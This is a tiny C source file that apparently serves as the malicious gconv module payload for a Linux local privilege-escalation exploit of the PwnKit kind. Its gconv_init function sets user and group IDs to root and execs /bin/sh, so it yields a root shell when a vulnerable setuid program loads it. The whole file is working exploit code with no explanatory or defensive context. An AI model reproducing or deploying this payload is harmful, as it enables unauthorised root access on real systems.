#include <unistd.h>

void gconv()
{
	return;
}

void gconv_init()
{
	setuid(0);
	seteuid(0);
	setgid(0);
	setegid(0);

	char *args[] = {"sh", NULL};
	char *env[] = {"PATH=/bin:/usr/bin:/sbin", NULL};
	execve("/bin/sh", args, env);
}
